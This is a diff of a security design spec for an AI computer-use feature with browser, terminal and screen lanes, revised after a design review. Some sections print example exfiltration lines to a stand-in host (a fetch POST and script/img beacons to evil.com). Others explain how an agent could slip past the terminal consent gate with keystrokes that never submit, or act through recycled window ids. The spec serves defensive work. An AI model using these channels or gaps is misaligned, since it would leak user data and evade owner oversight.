@@ -158,10 +158,29 @@ The gate reuses what I33 established rather than reimplementing it: the same `Sa
 interface CuEnvelope {
   readonly sessionId: string;
   readonly lane: "browser" | "terminal" | "screen";
-  readonly target: CuTarget;         // browser: origin allowlist · terminal: cwd + shell · screen: one window handle
+  readonly target: CuTarget;         // browser: origin sets · terminal: cwd + shell · screen: window identity tuple
   readonly maxActions: number;
   readonly maxWallClockMs: number;
   readonly approvedAt: number;
+}
+
+/** Browser lane. TWO origin sets, both approved up front, neither ever widened (§ 4.4). */
+interface CuBrowserTarget {
+  /** Where the agent may navigate. */
+  readonly navigateOrigins: readonly string[];
+  /** Additionally reachable by script-initiated requests (`fetch`/XHR/WS). See § 3.5.1. */
+  readonly scriptOrigins: readonly string[];
+}
+
+/**
+ * Screen lane. An identity TUPLE, not a bare handle — a window id alone is recyclable
+ * on every platform this ships to. Re-verified before every actuation (§ 3.6).
+ */
+interface CuScreenTarget {
+  readonly windowId: string;        // HWND · CGWindowID · X11 window id
+  readonly pid: number;
+  readonly executablePath: string;
+  readonly processStartedAt: number; // discriminates a RECYCLED pid
 }
 ```
 
@@ -179,7 +198,8 @@ Each lane derives a `SandboxPolicy` and spawns under the existing three-OS runne
   shared history, no access to the user's real browser profile** — this is the Phase 14 requirement
   and it is enforced by the filesystem grant set, not by a Chromium flag. Network is granted (a
   browser without network is not a browser), which is the first time this codebase grants network
-  to a sandboxed child, and is the reason § 6 exists.
+  to a sandboxed child, and is the reason § 6 exists. What that grant does *not* mean is "any origin":
+  see § 3.5.1.
 - **Terminal** — a PTY under the sandbox with `permissions.network` **empty by construction**,
   inheriting I33's posture unchanged. The shell starts with the curated `extensionProcessEnv()`
   environment (I1), not the gateway's, so gateway-private secrets never reach it, and with no
@@ -188,18 +208,80 @@ Each lane derives a `SandboxPolicy` and spawns under the existing three-OS runne
   the *target* application is a process the owner already runs. This is the fact that drives § 6.3:
   the sandbox has no purchase on the thing being driven.
 
+#### 3.5.1 Browser request policy — navigation is not the only way out
+
+The origin allowlist governing *navigation* is not, on its own, an exfiltration boundary. A page can
+issue `fetch("https://evil.com", {method:"POST", body: everythingItCanRead})` without navigating
+anywhere, and a `WebSocket` is worse: one handshake and the channel stays open. Gating navigation
+while leaving script-initiated requests unrestricted would have left the most convenient exfiltration
+path in the product wide open, and would have done it *under an allowlist*, which is worse than
+having no allowlist at all — the owner reads the approved origin list and reasonably concludes that
+is where data can go.
+
+The lane therefore discriminates on the CDP **resource type**, which Playwright surfaces per request,
+rather than on "navigation vs. everything else":
+
+| Resource type | Policy |
+|---|---|
+| `document`, `sub_frame` | Must be in `navigateOrigins`. Otherwise **refused**. |
+| `xhr`, `fetch`, `eventsource`, `websocket` | Must be in `navigateOrigins` ∪ `scriptOrigins`. Otherwise **refused**, and a `blocked` ledger row is appended. |
+| `stylesheet`, `image`, `font`, `media` | Allowed from any origin; a row is appended per distinct origin (§ 6.1). |
+| `script` | Allowed from any origin, **and this is the bound below.** |
+
+`scriptOrigins` is a second list on the envelope, approved by the owner up front alongside the
+navigation list, because a real site's own API and asset origins are not the same eTLD+1 as its
+document origin (`api.github.com` and `github.githubassets.com` against `github.com`), and a
+same-origin-only rule would break every non-trivial target. It is approved **before** any untrusted
+content has been read, which is what makes it a legitimate grant rather than a mid-session widening —
+and per § 4.4 it can never grow afterwards. Default: empty. A blocked request is a refusal the page
+sees as a network error; the session continues.
+
+**The bound, stated because the fix is a cost increase and not a closure.** Blocking `fetch`/XHR/WS
+closes the *convenient* channel, not the channel. A `<script src="https://evil.com/x.js?d=…">` or an
+`<img src="https://evil.com/?d=…">` injected into the DOM exfiltrates via the request **URL** on a
+resource type this policy allows, and an image beacon is the oldest trick in the category. Blocking
+`script` outright breaks essentially every modern site, and blocking `image` breaks the rest. What
+this policy buys is that such a channel must be built into the page's markup and is **rowed by
+origin** in the ledger (§ 6.1) — visible after the fact — rather than being available as an
+invisible one-line `fetch`. It is a real reduction and it is not a boundary.
+
+Reviewed and adopted from the 2026-08-30 design review, item 1 / improvement 3.
+
 ### 3.6 "Cannot drive Nimbus UI itself" — enforced twice
 
 Phase 14 states this as a requirement; a single mechanism would not carry it.
 
 1. The `computer.*` namespace is absent from the Tauri `ALLOWED_METHODS` (I7), so a compromised
    renderer cannot open a session at all.
-2. The screen driver refuses, at envelope-approval time and again at every actuation, a window handle
-   owned by any Nimbus process (gateway, CLI, Tauri). A window that closes mid-session terminates the
+2. The screen driver refuses, at envelope-approval time and again at every actuation, a window owned
+   by any Nimbus process (gateway, CLI, Tauri). A window that closes mid-session terminates the
    session rather than falling back to the desktop.
 
-Whole-desktop targeting is not expressible: the envelope carries exactly one handle, and there is no
+Whole-desktop targeting is not expressible: the envelope carries exactly one target, and there is no
 sentinel value meaning "all".
+
+**A window id alone is not an identity, and binding to one would have been exploitable.** `HWND`,
+`CGWindowID` and X11 window ids are all **recycled** by their platforms. So "the window closed →
+terminate" is only sound if the close is *noticed*: an attacker who can crash or close the target and
+immediately open their own window can be handed the same id, and every subsequent liveness check
+passes while the agent types into a different application. Raised by the 2026-08-30 design review,
+item 3, and correct.
+
+The envelope therefore binds a **tuple** — `CuScreenTarget` in § 3.4 — and re-verifies **all four
+fields before every actuation**, not on a liveness poll:
+
+| Field | Windows | macOS | Linux (X11) |
+|---|---|---|---|
+| window id | `HWND` | `CGWindowID` | X11 window id |
+| owning pid | `GetWindowThreadProcessId` | `kCGWindowOwnerPID` | `_NET_WM_PID` |
+| executable path | `QueryFullProcessImageName` | `proc_pidpath` | `/proc/<pid>/exe` |
+| process start time | `GetProcessTimes` | `kinfo_proc.p_starttime` | `/proc/<pid>/stat` field 22 |
+
+Process start time is not belt-and-braces: **pids are recycled too**, so id + pid + path is still
+spoofable by a process that relaunches the same binary. Start time is what makes the tuple identify
+one specific process instance. Any mismatch terminates the session with
+`terminated_target_lost` — it never re-prompts, because "your target changed, approve the new one?"
+is the mid-session widening § 4.2 exists to refuse.
 
 ---
 
@@ -238,8 +320,8 @@ be believed has no gate at all.
 
 | Lane | Signal the classifier reads | `actuating` when |
 |---|---|---|
-| **Browser** | The resolved DOM node, via Playwright/CDP | `<form>` submission · `<button type=submit>` / `<input type=submit>` · `<input type=file>` · any field inside a form containing an `<input type=password>` · `Page.downloadWillBegin` · a navigation whose resolved origin differs from the current one |
-| **Terminal** | The bytes of the PTY write | The write contains a submit (`\n` / `\r`). Keystrokes that do not submit are `observing`. |
+| **Browser** | The resolved DOM node, via Playwright/CDP | `<form>` submission · `<button type=submit>` / `<input type=submit>` · `<input type=file>` · any field inside a form containing an `<input type=password>` · `Page.downloadWillBegin` · a navigation whose resolved origin differs from the current one · a script-initiated request outside the envelope's origin sets (§ 3.5.1) |
+| **Terminal** | The accumulated, not-yet-written line buffer | **Always** — nothing reaches the PTY except a complete, owner-approved line (§ 4.3.1). |
 | **Screen** | *Nothing exists to read.* | **Always.** |
 
 Three notes on that table, each of which is a decision rather than an omission:
@@ -249,9 +331,38 @@ Three notes on that table, each of which is a decision rather than an omission:
   weight, and the reason the other two lanes are deliberately blunter rather than cleverer.
 - **The terminal lane gets no command allowlist.** An allowlist over shell command text is defeated
   by quoting, substitution, aliasing and encoding, and a defense that can be quoted around is worse
-  than no defense because it is *believed*. Submit-or-not is crude, structural, and un-quotable. In
-  practice this makes the terminal lane per-command HITL, which is the correct posture for its blast
-  radius.
+  than no defense because it is *believed*. Whole-line HITL is crude, structural, and un-quotable.
+  This makes the terminal lane per-command HITL, which is the correct posture for its blast radius.
+
+#### 4.3.1 The terminal lane buffers; nothing reaches the PTY unapproved
+
+The first version of this design classified a PTY write as `actuating` only when it contained a
+submit character, and treated everything else as `observing`. **That was wrong, and it was the kind
+of wrong that ships a hole rather than a rough edge.** If bytes reach the PTY as they are typed, then
+inside an interactive program a single character *is* the destructive action: `dd` in `vi` deletes a
+line, `y` answers a confirmation prompt, `Ctrl-C` and `Ctrl-D` signal, and `fzf` executes on a
+keypress. Every one of those would have classified as `observing` and been auto-satisfied, so the
+lane's consent gate would have been bypassable by a model that simply never sent a newline. Caught by
+the 2026-08-30 design review, item 2 / improvement 1.
+
+The fix, and the scope narrowing that has to come with it:
+
+1. **Bytes accumulate in a gateway-side buffer. Nothing is written to the PTY device until a submit
+   arrives, the whole line is shown to the owner, and the owner approves.** The buffer is the unit of
+   consent, so the owner approves the command they will actually run, in full, once.
+2. **Control characters and escape sequences are refused, not buffered.** A lane that cannot safely
+   deliver `y` cannot safely deliver `Ctrl-C` either, and buffering a control byte until a newline
+   that never comes is a silent hang rather than a refusal.
+3. **The terminal lane is therefore line-oriented only in this slice.** Full-screen TUIs — `vi`,
+   `less`, `top`, `fzf`, interactive prompts — are out of scope and will not work. That is a real
+   capability loss and it is the correct trade: the alternative is a lane whose consent unit is a
+   keystroke, which is unreviewable by a human and is the fatigue attack in its purest form. Phase 14
+   already defers the analogous `nimbus exec --interactive` for the same reason.
+
+The consequence for § 4.3's table is that the terminal lane has **no `observing` class at all**, the
+same as the screen lane and for a different reason: on the screen lane nothing can be classified, and
+here nothing reaches the actuator unapproved. Both lanes therefore auto-satisfy nothing, ever, and
+only the browser lane's `observing` class is load-bearing.
 - **The screen lane has no `observing` class at all.** `click(412, 388)` against a foreign window has
   no machine-readable semantics — there is no node, no role, no label the gateway can independently
   verify. So every screen actuation prompts, always, regardless of the session opt-in. This falls out
@@ -294,8 +405,10 @@ sequence, out-of-envelope is refused rather than prompted, the HITL class is der
 the gateway observes rather than from model output, and the envelope only narrows. Each layer fails
 independently of the others.
 
-**On the terminal lane: yes, but only because the lane is blunt.** Every submitted command prompts.
-There is no auto-satisfy to attack. The residual risk is fatigue, mitigated only by the action budget.
+**On the terminal lane: yes, but only because the lane is blunt.** Every command prompts, in full,
+before a single byte reaches the PTY (§ 4.3.1). There is no auto-satisfy to attack — the class does
+not exist on this lane. The residual risk is fatigue, mitigated only by the action budget, plus the
+plain fact that a human approving a shell line has seen it and not necessarily understood it.
 
 **On the screen lane: no — and this should be recorded rather than argued around.** There is no
 structural classifier available, so the boundary degrades to a human reading a screenshot and
@@ -367,9 +480,13 @@ the sandboxed profile's cookies. That is precisely what I29 exists to count.
 - **Reusing `chatops` is rejected** for the obvious reason and stated only so the record is complete.
 
 **Granularity: `per-run`.** One row per *(navigation, distinct destination origin)* pair, appended
-before the request, fail-closed, with a `blocked` row on denial. `destination` is the **origin**,
-never a full URL — matching `summarizeDestination`'s rule that no secret-bearing query string is ever
-stored.
+before the request, fail-closed. `destination` is the **origin**, never a full URL — matching
+`summarizeDestination`'s rule that no secret-bearing query string is ever stored.
+
+A request refused by § 3.5.1 appends a **`blocked`** row, exactly as a denied gate does in the
+executor. This matters more here than it looks: a cluster of `blocked` rows naming an origin the owner
+never approved is the clearest signal in the whole feature that something was steering the page toward
+exfiltration, and it is retained even though nothing left the machine.
 
 Why not `per-call`: one navigation produces dozens to thousands of subresource requests, and a row
 per request would bury the ledger. Why not one row per navigation only: a page pulls from origins the
@@ -550,8 +667,10 @@ CREATE TABLE cu_action (
   model_description   TEXT,            -- untrusted; recorded for forensics, never for classification
   hitl_status         TEXT NOT NULL,
   outcome             TEXT NOT NULL,
-  dom_before          TEXT,            -- browser lane only
+  dom_before          TEXT,            -- browser lane only; NULLed by retention (§ 8.4)
   dom_after           TEXT,
+  dom_truncated       INTEGER NOT NULL DEFAULT 0,  -- 1 when a snapshot exceeded snapshot_max_bytes
+  dom_original_bytes  INTEGER,         -- pre-truncation size, so a clipped row is never mistaken for a whole one
   screenshot_digest   TEXT,            -- digest only; pixels are never stored
   timestamp           INTEGER NOT NULL,
   UNIQUE (session_id, seq)
@@ -562,17 +681,51 @@ Append-only and forward-only, per the migration rules. `observed_target` and `mo
 separate columns on purpose: collapsing them would destroy the one distinction the whole design turns
 on, and would do it in the record an incident responder reads.
 
+#### 8.4 Snapshot retention — and why it is NOT `egress.prune`
+
+`dom_before` / `dom_after` are full DOM snapshots: 100 KB–2 MB each, two per action, up to
+`max_actions` per session. A single 50-action session can add ~200 MB to the user's SQLite file, and
+nothing in the design as first written ever removed them. Raised by the 2026-08-30 design review,
+improvement 2, and correct — this would have bloated the database fast.
+
+Two bounds and a prune:
+
+- **Per-row cap.** A snapshot above `snapshot_max_bytes` (default 256 KB) is stored truncated, with
+  the truncation and the original byte length recorded on the row — the `truncated` convention exec
+  already uses, so a reader can never mistake a clipped snapshot for a complete one.
+- **Retention.** `[computer_use] snapshot_retention_days` (default **7**) nulls `dom_before` /
+  `dom_after` past the window, run by the existing retention pass. The decision row in `audit_log`
+  survives — the forensic record of *what was approved and what happened* is permanent; only the bulky
+  replay body ages out.
+- **`nimbus computer prune`** for the manual path.
+
+**The review suggested plugging this into `egress.prune`, and that is the one part of the item I am
+rejecting.** `egress.prune` is the **sole mutation** of `egress_ledger` under I29 — HITL-gated, and
+writing a continuing tombstone so the BLAKE3 chain still verifies across the gap. That narrowness *is*
+the invariant: "the only thing that ever mutates this table is one gated, tombstoned operation" is a
+claim `nimbus prove` rests on. Teaching it to also delete rows from an unrelated table would widen an
+I29 surface for a database-hygiene errand, and would make the next auditor of `egress.prune` read two
+subsystems to convince themselves of one claim. `cu_action` is not the egress ledger, is not chained,
+and gets its own prune.
+
+The default of 7 days is short on purpose, and the reason is privacy rather than disk: a DOM snapshot
+contains whatever was on the page, which can include the user's private data and session tokens
+present in the document. Under § 7 no pixels are ever stored, and it would be incoherent to be strict
+about screenshots while retaining an indefinite archive of page contents.
+
 ---
 
 ## 9. Configuration and CLI
 
 ```toml
 [computer_use]
-enabled = false            # DEFAULT OFF
-allowed_lanes = []         # DEFAULT EMPTY — enabling the capability grants no lane
+enabled = false                # DEFAULT OFF
+allowed_lanes = []             # DEFAULT EMPTY — enabling the capability grants no lane
 max_actions = 50
 max_wall_clock_ms = 300000
-browser_profile_dir = ""   # defaults to <configDir>/computer-use/profile
+browser_profile_dir = ""       # defaults to <configDir>/computer-use/profile
+snapshot_max_bytes = 262144    # per-DOM-snapshot cap; above this the row records a truncation
+snapshot_retention_days = 7    # DOM snapshots age out; the audit decision row is permanent (§ 8.4)
 ```
 
 **`allowed_lanes` defaults to empty**, which is a deliberate second lock and a departure from
@@ -625,6 +778,19 @@ fail-closed; obtains a **single-use** owner approval for every `actuating` actio
 calls `performActuation`. Once the taint latch is set the envelope may only narrow: origins never
 grow, budgets never rise, no actuation is ever auto-satisfied. Every outcome appends one chained
 `computer.action` audit row. Screenshot pixels are never written to disk.
+
+Three per-lane clauses are part of the invariant rather than of the lanes, because each is a place a
+plausible implementation silently loses the property:
+
+- **Browser** — a request is admitted by CDP **resource type** against the envelope's two origin sets
+  (§ 3.5.1). A navigation-only allowlist does not satisfy this clause: `fetch`, XHR, `eventsource` and
+  `websocket` are gated too, and a refusal appends a `blocked` row.
+- **Terminal** — **no byte reaches the PTY before the owner has approved the complete line.** Bytes
+  accumulate gateway-side; control characters are refused rather than buffered. A per-keystroke write
+  path violates this clause even if each keystroke is individually classified.
+- **Screen** — the target is an identity **tuple** (window id, pid, executable path, process start
+  time), re-verified before **every** actuation. A bare window id does not satisfy this clause, because
+  every platform recycles them.
 
 **Anti-patterns.** Classifying an action from the model's `description` field. Prompting on an
 out-of-envelope action instead of refusing it. Any path that widens a live envelope. Reusing an
@@ -680,8 +846,19 @@ enforcement test — per the standing rule. Retiring means deleting the row, nev
 - **Terminal loopback** — per-platform integration test: a sandboxed shell cannot reach the gateway's
   own IPC socket or `127.0.0.1` HTTP port. This is I33's test extended to the PTY, and it must be
   per-platform because the property holds via three unrelated mechanisms.
-- **Nimbus-window refusal** — per-platform: the screen lane refuses a Nimbus-owned window handle at
-  approval and again at actuation.
+- **Nimbus-window refusal** — per-platform: the screen lane refuses a Nimbus-owned window at approval
+  and again at actuation.
+- **Window-identity re-verification** — per-platform: close the target and open a replacement that
+  acquires the same window id; assert the session terminates `terminated_target_lost` and the
+  actuator's call count is zero. Then the same with a *relaunched same binary* (fresh pid, same path)
+  to prove `processStartedAt` is what discriminates, not the path.
+- **Script-request refusal** — a page issuing `fetch` / `WebSocket` to an unapproved origin is refused
+  and a `blocked` row is appended, while an `<img>` from the same origin loads and appends an
+  `authorized` row. The second half is as important as the first: it pins the documented bound so a
+  later reader cannot mistake § 3.5.1 for a closed boundary.
+- **Terminal buffering** — a sequence of keystrokes containing no submit writes **zero bytes** to the
+  PTY and raises **zero** consent prompts; a control character is refused rather than buffered. Assert
+  the PTY write count, not just the absence of an error.
 - **No pixels on disk** — a filesystem watcher over the config dir and temp dirs across a full screen
   session asserts zero image files created. Not a code inspection; an observation.
 - **Egress completeness** — a browser session's ledger rows enumerate every distinct origin the
@@ -701,17 +878,30 @@ own OS leg, so `audit:platform-test-gaps` will name them and local green says no
    window containing one screen actuation.** § 6.3. This is charged to clean sessions too.
 2. **A screenshot is not covered by I11 and cannot be.** § 5. Pixel-rendered instructions sit inside
    no envelope. The latch reduces reach; nothing closes it.
-3. **The browser origin allowlist governs navigation, not subresource loading.** Blocking third-party
-   subresources breaks the real web, so a page will contact origins the owner never named. The
-   per-origin row design *surfaces* this rather than preventing it — the ledger names those hosts, the
-   allowlist does not stop them.
-4. **Wayland may make the screen lane unimplementable without `xdg-desktop-portal`.** Targeted
-   synthetic input is not available to an unprivileged client on Wayland the way it is on X11. This
-   collides with non-negotiable #5 (platform equality) and needs a decision *before* implementation:
-   portal dependency, X11-only with an explicit refusal on Wayland, or the screen lane not shipping
-   on Linux. Recorded here rather than discovered in CI.
-5. **The terminal classifier is submit-or-not.** A single submitted line can do arbitrary damage; the
-   gate proves the owner saw it, not that the owner understood it.
+3. **Script and image subresources may still beacon out.** § 3.5.1 refuses `fetch`/XHR/`WebSocket` to
+   unapproved origins, but `script` and `image` load from anywhere — blocking either breaks the real
+   web — so a `<script src>` or `<img src>` whose *URL* carries the payload remains a working
+   exfiltration channel. It must be built into the page's markup and it is rowed by origin in the
+   ledger, which makes it visible after the fact and more expensive than a one-line `fetch`. It is not
+   prevented.
+4. **Wayland cannot do targeted synthetic input without a portal — decided, not open.** X11 exposes
+   it directly; Wayland deliberately does not, and the only sanctioned route is
+   `xdg-desktop-portal`'s `RemoteDesktop` interface, whose availability varies by compositor (GNOME
+   and KDE implement it; wlroots-based compositors vary). **The decision: attempt the portal, and if
+   it is unavailable, refuse the screen lane at envelope-approval time with a named reason** —
+   before consent, never a silent degradation to a partly-working lane.
+
+   This reuses `canConfine`'s shape exactly: a platform answers "can I actually do this here?" for
+   its own mechanism, and a no is an environmental refusal rather than a code branch in the gate.
+   It is also the reading of non-negotiable #5 that this codebase already applies — the *capability*
+   is offered on all three platforms, and a specific host lacking a required mechanism refuses, the
+   same class as `ERR_EXEC_SANDBOX_DEGRADED` on a machine without bubblewrap. Platform equality means
+   no platform is a second-class target, not that every environment can satisfy every prerequisite.
+   Raised by the 2026-08-30 design review, item 4.
+5. **The terminal lane is line-oriented only, and approval proves sight rather than understanding.**
+   Full-screen TUIs (`vi`, `less`, `top`, `fzf`, interactive confirmations) do not work at all — the
+   deliberate cost of § 4.3.1's buffering. And a single approved line can still do arbitrary damage:
+   the gate proves the owner saw the command, never that they understood it.
 6. **`observed_target` proves what the classifier read, not that the page is what it appears to be.**
    A DOM can be constructed to make a destructive control look innocuous to both the classifier and
    the human. Structural classification raises the floor; it does not make the prompt trustworthy.
@@ -739,7 +929,44 @@ puts the honesty-costly lane last, where it can be dropped without unpicking any
 
 ---
 
-## 15. Docs to update on landing
+## 15. Review disposition (2026-08-30)
+
+Against [`2026-08-30-s2-computer-use-design-review.md`](./2026-08-30-s2-computer-use-design-review.md).
+All five items accepted; one adopted with its proposed mechanism rejected. Nothing deferred — each is
+a pre-implementation design question that would otherwise have shipped as a hole.
+
+| # | Item | Disposition |
+|---|---|---|
+| Q1 + I3 | `fetch`/XHR/WebSocket exfiltration past a navigation-only allowlist | **Fixed** — § 3.5.1. Resource-type policy, second `scriptOrigins` list on the envelope, `blocked` rows. Bound stated: `script`/`image` beacons survive. |
+| Q2 + I1 | Terminal incremental writes bypass the submit-based classifier | **Fixed** — § 4.3.1. Full buffering, control characters refused, lane narrowed to line-oriented. |
+| Q3 | Window handle recycling / spoofing | **Fixed** — § 3.6. Identity tuple incl. process start time, re-verified every actuation. |
+| Q4 | Wayland fallback and platform equality | **Fixed** — § 13 bound 4. Decided: portal-if-available, named refusal otherwise. |
+| I2 | DOM snapshot growth | **Fixed, mechanism rejected** — § 8.4. Own cap + retention + `nimbus computer prune`; **not** folded into `egress.prune`. |
+
+Three of these changed the design rather than clarifying it, and two changed a security claim:
+
+**Q2 was a hole, not a rough edge.** The submit-based classifier meant a model that never sent a
+newline could drive `vi`, answer confirmation prompts and send signals with every action classified
+`observing` and auto-satisfied. That is a complete bypass of the terminal lane's consent gate, and it
+was in a table I wrote to demonstrate that classification was structural. The lesson generalises past
+this spec: "structural" is a property of *what the classifier reads*, and reading a real byte does not
+help if the predicate over it is wrong. A structural signal with an unsound predicate is still
+unsound, and it is more dangerous than an obviously weak one because it looks rigorous.
+
+**Q1 was a boundary that did not extend as far as its name implied.** An origin allowlist that governs
+navigation while `fetch` reaches anywhere is worse than no allowlist, because the owner reads the
+approved list and concludes that is where data can go. This is the same defect class the repo has
+recorded twice — `mcp`/`http` covering less than their names suggest, and the `chatops` class existing
+only after a brief had already reached Slack — and it is the reason § 3.5.1 states its residual bound
+in the same breath as its fix rather than in a footnote.
+
+**I2's mechanism is rejected on invariant-surface grounds, not on taste.** Widening `egress.prune` to
+service an unrelated table would dilute the "sole mutation, tombstoned, HITL-gated" property that
+I29's chain claim rests on. The concern was right; the plumbing belongs elsewhere.
+
+---
+
+## 16. Docs to update on landing
 
 `CLAUDE.md` (invariant summary + S2 status), `GEMINI.md` (mirror), `docs/SECURITY-INVARIANTS.md`
 (the I35 section, plus D26 in the static-complement list), `docs/roadmap.md` (the S2 row and Phase 14
